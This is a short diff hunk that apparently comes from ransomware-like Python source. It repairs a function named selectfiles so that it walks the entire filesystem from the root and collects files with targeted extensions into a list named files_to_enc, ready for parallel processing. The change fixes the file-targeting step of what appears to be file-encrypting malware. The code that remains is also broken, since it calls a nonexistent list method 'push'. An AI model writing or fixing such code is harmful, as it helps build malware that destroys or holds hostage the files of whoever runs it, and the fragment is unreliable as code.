@@ -82,7 +82,7 @@ def selectfiles():
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
         for file in files:
-            if file.(tuple(ext)):
+            if file.endswith(tuple(ext)):
                 files_to_enc.push(os.path.join(root, file))
 
     pool = Pool(processes=4)
